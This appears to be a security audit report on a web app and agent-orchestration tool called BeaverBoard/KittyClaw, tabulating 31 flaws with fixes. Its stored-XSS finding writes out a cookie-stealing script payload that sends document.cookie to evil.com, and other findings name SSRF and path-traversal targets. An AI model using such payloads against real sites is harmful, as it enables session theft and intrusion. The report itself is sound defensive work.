# Security Audit Report — BeaverBoard / KittyClaw

## Executive Summary

This audit identified **multiple critical vulnerabilities** that would block production readiness. The most severe issues are:

1. **Broken API token authentication** — IDE endpoints declare `RequireAuthorization("ApiToken")` but ASP.NET Core authentication/authorization services are never registered, making the policy a no-op. All IDE endpoints are publicly accessible.
2. **Zero authentication on the entire non-IDE API** — Every board, ticket, chat, run, image, and automation endpoint is unprotected.
3. **Unsafe command-line argument construction** in `OpenCodeRunner` enables command injection.
4. **Unsanitized markdown rendering** allows stored XSS in chat and comments.
5. **Unvalidated workspace paths** allow arbitrary file read/write/execution via path traversal.

---

## Critical Issues

| # | File | Line | Issue | Impact | Suggested Fix |
|---|------|------|-------|--------|---------------|
| 1 | `KittyClaw.Web/Program.cs` | 108 (missing) | `AddAuthentication()` and `AddAuthorization()` are never called. The `ApiToken` policy referenced in `RequireAuthorization("ApiToken")` is never registered. | **Auth bypass on all IDE endpoints.** Any network client can list projects, read the board, create tickets, start agent executions, post chat messages, and generate new API tokens. | Register auth services in `Program.cs`:<br>`builder.Services.AddAuthentication(...).AddScheme(...);`<br>`builder.Services.AddAuthorization(options => options.AddPolicy("ApiToken", policy => policy.RequireAuthenticatedUser()));`<br>`app.UseAuthentication(); app.UseAuthorization();` |
| 2 | `KittyClaw.Web/Api/Endpoints.*.cs` | All | No `[Authorize]`, `RequireAuthorization`, or `ApiTokenResult` binding is applied to any non-IDE endpoint (`/api/projects`, `/api/tickets`, `/api/runs`, `/api/chat`, `/api/images`, etc.). | **Complete API exposure.** Anyone with network access can create, modify, delete tickets, trigger AI agent runs, upload files, post chat messages, and change settings. | Add a global auth filter or require `ApiTokenResult` on all sensitive endpoints. For a local-only tool, consider adding a default auth requirement to the `/api` group and only exempting the health check. |
| 3 | `KittyClaw.Core/Integrations/OpenCode/OpenCodeRunner.cs` | 553–556, 808–831 | `Arguments` is built via `string.Join(" ", arguments)` instead of `ArgumentList`. `ApplyCommandTemplate` does naive string replacement (`Replace("{prompt}", request.Prompt)`) into command arguments. | **Command injection / argument splitting.** If `request.Prompt`, `request.WorktreePath`, or other user-controlled fields contain spaces, quotes, or shell metacharacters, they will be misinterpreted by the OpenCode CLI or the OS command-line parser. | Switch to `ProcessStartInfo.ArgumentList` (as done correctly in `ProcessLifecycleManager.cs:92`). Validate and escape all template placeholders. Do not use string concatenation for process arguments. |
| 4 | `KittyClaw.Web/Markdown/ChatMarkdownRenderer.cs` | 18 | `Markdig.Markdown.ToHtml` is called with `UseAdvancedExtensions()` but **no HTML sanitization**. | **Stored XSS.** Any user can inject raw HTML/JS into chat messages or comments (e.g., `<script>fetch('http://evil.com/?cookie='+document.cookie)</script>`), which will be rendered in the browser when other users view the chat. | Pipe Markdig output through an HTML sanitizer such as **HtmlSanitizer** or **AngleSharp** before returning it to the client. |
| 5 | `KittyClaw.Web/Markdown/CommentMarkdownPipeline.cs` | 10–13 | Same as above — `UseAdvancedExtensions()` without sanitization. | **Stored XSS** in ticket comments. | Apply the same sanitizer to all Markdown output, or configure a custom Markdig renderer that strips dangerous HTML. |
| 6 | `KittyClaw.Core/Services/ProjectService.cs` | 112 | `workspacePath` is accepted from user input (`UpdateProjectAsync`) without validation. | **Path traversal → arbitrary file read/write/execution.** An attacker can set the workspace path to `/etc`, `/home/user`, or any system directory. All subsequent dashboard operations (`WriteOutput`, `DeleteTileFolder`, `WriteSidecar`, `ReadScript`), image uploads, and **script execution** (`DashboardScriptRunner`) will target that directory. | Validate `workspacePath` with `Path.GetFullPath` and ensure it starts with an allowed root (e.g., the app's data directory or a user-configured whitelist). Reject `..` and path separator characters. |
| 7 | `KittyClaw.Web/Api/Endpoints.Roster.cs` | 134 | `POST /api/roster/opencode-config/write` writes `configJson` directly to `Path.Combine(workspacePath, "opencode.json")` using an unvalidated `workspacePath` from `IConfiguration`. | **Arbitrary file write.** If the config workspace path points to a sensitive directory (e.g., `~/.ssh/`), the endpoint will overwrite files there. | Validate `workspacePath` before writing. Ensure it is within an allowed directory. |
| 8 | `KittyClaw.Core/Integrations/OpenCode/OpenCodeRunner.cs` | 179–186 | `ExecuteViaServerAsync` makes HTTP requests to `_config.ServerUrl` with no URL validation. | **SSRF.** If the app is deployed behind a firewall or in a cloud environment, an attacker (or a compromised agent) can set `ServerUrl` to internal services (e.g., `http://169.254.169.254/` for cloud metadata) and exfiltrate data. | Validate `ServerUrl` against an allow-list of hosts, or restrict it to localhost/loopback only. Reject private IP ranges and internal hostnames. |
| 9 | `KittyClaw.Web/Api/Endpoints.Images.cs` | 11–26 | Image upload derives the extension from `ContentType` (spoofable) and saves the raw bytes without content validation. `.DisableAntiforgery()` is present. | **File upload abuse / content-type spoofing.** An attacker can upload a `.html` or `.js` file with `Content-Type: image/png` and it will be saved as `guid.png`. If later served with the wrong content type or processed by a browser, it could lead to XSS or malware delivery. | Validate the file content using magic bytes / image format parsing (e.g., `Image.Load` from ImageSharp). Do not trust the `Content-Type` header. Keep `.DisableAntiforgery` only if you have an alternative CSRF mechanism (but you don't). |
| 10 | `KittyClaw.Core/Services/DashboardScriptRunner.cs` | 33–75 | Executes arbitrary `.ps1`, `.sh`, `.js`, `.py` files found in the workspace with full user privileges. No sandboxing, no signature verification, no allow-list. | **Arbitrary code execution.** If an attacker can place a script file in the workspace (via path traversal or other means), it will be executed with the same privileges as the app. | Sandbox script execution (e.g., restricted user, container, or at minimum an explicit allow-list of approved script paths). Never execute files from user-writable directories without additional controls. |

---

## Important Issues

| # | File | Line | Issue | Impact | Suggested Fix |
|---|------|------|-------|--------|---------------|
| 11 | `KittyClaw.Web/Program.cs` | 211–224 | CORS policy `LocalOnly` uses `AllowAnyMethod()` and `AllowAnyHeader()` on localhost origins. | Cross-origin attacks from other localhost services (e.g., a malicious website running on `localhost:3000`) can interact with the API. Combined with missing auth, this is a full CORS bypass. | Restrict to `AllowMethods("GET", "POST", "PUT", "PATCH", "DELETE")` and explicitly list allowed headers. Consider adding `AllowCredentials()` only if auth is fixed. |
| 12 | `KittyClaw.Web/appsettings.json` | 8 | `"AllowedHosts": "*"` | The app accepts requests with **any** `Host` header. This facilitates DNS rebinding, virtual host confusion, and Host header injection attacks. | Set `AllowedHosts` to `127.0.0.1;localhost` or remove the wildcard. |
| 13 | `KittyClaw.Core/Services/SettingsService.cs` | 15, 46 | `settings.json` stores the API token hash (`ApiTokenHash`) in plaintext on disk with no encryption. | If an attacker gains local file access, they can read the SHA256 hash and brute-force the token offline. | Use a key-derivation function (PBKDF2, Argon2, or BCrypt) with salt instead of plain SHA256. Alternatively, store the token in the OS keychain (macOS Keychain, Windows DPAPI, Linux Secret Service). |
| 14 | `KittyClaw.Web/Api/Endpoints.Ide.cs` | 345–355 | `GenerateToken` endpoint returns the raw token in the JSON response and stores the SHA256 hash. | The token is only shown once, but there is no mechanism to revoke or rotate tokens. A leaked token gives indefinite access until manually overwritten. | Implement token expiration, rotation, and a secure revocation mechanism. Store hashes with salt. |
| 15 | `KittyClaw.Core/Integrations/OpenCode/OpenCodeRunner.cs` | 565–568 | Environment variables for the child process are set from `request.Environment` (user-controlled dictionary). | **Environment variable injection / info disclosure.** Malicious env vars can alter CLI behavior, inject proxy settings, or leak sensitive paths. | Validate and sanitize all environment variable keys and values against an explicit allow-list. |
| 16 | `KittyClaw.Web/Program.cs` | 15–31 | App explicitly disables HTTPS (`http://127.0.0.1:5230`). | Credentials, tokens, and chat data are transmitted in plaintext over the network. | Support HTTPS with a self-signed certificate or document that reverse-proxy TLS is required for any network exposure. |
| 17 | `KittyClaw.Web/Api/Endpoints.Dashboard.cs` | 126–133 | `POST /api/projects/{slug}/dashboard/tiles/{tileSlug}/refresh` uses `Task.Run(...)` without path validation inside the refresh service. | If the refresh service reuses the same `tileSlug` without re-validating, the `IsInsideTileDir` check in the endpoint may be bypassed asynchronously. | Ensure `DashboardRefreshService` validates the tile path before any file I/O, or pass only the validated path to the service. |
| 18 | `KittyClaw.Core/Automation/ClaudeRunner.cs` | 381–398 | `claude` CLI is invoked with `--dangerously-skip-permissions`. | Agent runs bypass the CLI's permission prompts. If the agent is compromised or misled, it can execute destructive tool calls without confirmation. | Document the security trade-off. Consider requiring user confirmation for high-risk tool use in production. |
| 19 | `KittyClaw.Web/Api/Endpoints.Ide.cs` | 316–336 | `SendChatMessage` endpoint accepts `req.Body` and writes it directly to team chat without length limits or content sanitization. | **DoS / spam.** An attacker can send extremely large messages or flood the chat channel. | Add input validation: max length, rate limiting, and content sanitization before persistence. |
| 20 | `KittyClaw.Web/Program.cs` | 262–273 | Dev endpoints (`/api/dev/update-check/simulate`, `/api/dev/update-check/reset`) are gated only by `app.Environment.IsDevelopment()`. | If the app is accidentally started in Development mode in production, these endpoints are exposed. | Remove dev endpoints entirely from production builds, or use `#if DEBUG` compile-time guards. |

---

## Minor Issues (Hardening & Best Practices)

| # | File | Line | Issue | Impact | Suggested Fix |
|---|------|------|-------|--------|---------------|
| 21 | `KittyClaw.Web/Program.cs` | 367 | `File.WriteAllText(BeaverBoardPaths.PidFile, currentPid.ToString())` is non-atomic and lacks a lock. | Concurrent backend starts could race and overwrite the PID file. | Use an exclusive file lock or an atomic write operation. |
| 22 | `KittyClaw.Web/Program.cs` | 287–334 | Health check writes and deletes a test file in the uploads directory. | Minor disk I/O; could leak path existence if the file fails to delete. | Use a memory-based or in-process health check instead of disk writes. |
| 23 | `KittyClaw.Core/Services/BeaverBoardPaths.cs` | 25–38 | `BEAVERBOARD_DATA_DIR` / `KITTYCLAW_DATA_DIR` environment variables are accepted without validation. | Data could be redirected to arbitrary locations, including network shares or attacker-controlled directories. | Validate that the env-var path is absolute, contains no `..`, and is writable. |
| 24 | `KittyClaw.Web/Api/Endpoints.Images.cs` | 26 | `.DisableAntiforgery()` is used on the image upload endpoint. | CSRF protection is disabled. In a browser context, a malicious site could POST images on behalf of the user. | Remove `.DisableAntiforgery()` and ensure the Blazor frontend includes the antiforgery token. If the endpoint must be API-accessible, use a different route or auth token. |
| 25 | `KittyClaw.Web/Api/Endpoints.Dashboard.cs` | 142–148 | `IsInsideTileDir` uses `Path.GetFullPath` but the `StartsWith` check is case-sensitive (`StringComparison.Ordinal`). On Windows, case-insensitive filesystems could bypass the check with case variations. | Potential path traversal on Windows if case manipulation is combined with other tricks. | Use `StringComparison.OrdinalIgnoreCase` on Windows, or normalize both paths with `Path.GetFullPath` before comparison. |
| 26 | `KittyClaw.Web/Api/Endpoints.Dashboard.cs` | 116–122 | `MapGet("/projects/{slug}/dashboard/tiles/{tileSlug}/script")` reads and returns the raw script content as text. | Information disclosure — reveals implementation details of dashboard scripts. | Consider whether script content should be exposed to all clients, or require a specific permission. |
| 27 | `KittyClaw.Core/Automation/ClaudeRunner.cs` | 189 | `CancellationTokenSource` timeout is 10 minutes for user answers. | Long-running waits can be exploited for resource exhaustion if many runs are awaiting answers. | Make the timeout configurable and bounded. |
| 28 | `KittyClaw.Web/Api/Endpoints.Chat.cs` | 196 | `runner.StartAsync(request, CancellationToken.None)` is fire-and-forget with no global rate limit. | Unlimited chat starts can exhaust the `RunConcurrencyGate` or spawn unbounded background tasks. | Add rate limiting or user-specific throttling on chat start requests. |
| 29 | `KittyClaw.Core/Automation/AutomationEngine.cs` | 81–100 | Background service catches all exceptions and logs them, but continues ticking. | If a persistent bug (e.g., SQLite corruption) causes repeated exceptions, the loop will churn CPU and fill logs. | Implement an exponential backoff and circuit breaker for repeated tick failures. |
| 30 | `KittyClaw.Web/Api/Endpoints.Runs.cs` | 151–157 | SSE stream endpoint does not validate `since` parameter format strictly. | Invalid `since` values are silently ignored rather than rejected. | Return `400 Bad Request` for malformed `since` values instead of silently proceeding. |
| 31 | `KittyClaw.Web/Program.cs` | 248–254 | Uploads directory is served via `StaticFileOptions` with no request filtering. | Files uploaded by one user are accessible to all clients. If malicious HTML/JS is uploaded, it could be executed in the browser context. | Serve uploads with a restrictive content-type policy or through a controller that validates the file before streaming. |

---

## Recommended Priority Order

1. **Fix authentication/authorization** (Issues 1–2) — this is the single biggest blocker. Without it, the entire API is exposed.
2. **Add HTML sanitization** (Issues 4–5) — XSS is trivial to exploit and dangerous.
3. **Validate workspace paths** (Issues 6–7) — path traversal leads to arbitrary code execution.
4. **Fix command-line argument handling** (Issue 3) — command injection in OpenCode runner.
5. **Harden file uploads** (Issue 9) — validate file content, not just extensions.
6. **Sandbox script execution** (Issue 10) — arbitrary script execution is a major risk.
7. **CORS and host hardening** (Issues 11–12, 16) — tighten the network surface.
8. **Secure token storage** (Issues 13–14) — use proper KDF and OS keychain.
9. **SSRF protection** (Issue 8) — validate OpenCode server URLs.
10. **Rate limiting and input validation** (Issues 17–30) — defense in depth.

---

*Report generated by security-focused code review. Recommend re-audit after fixes are applied.*
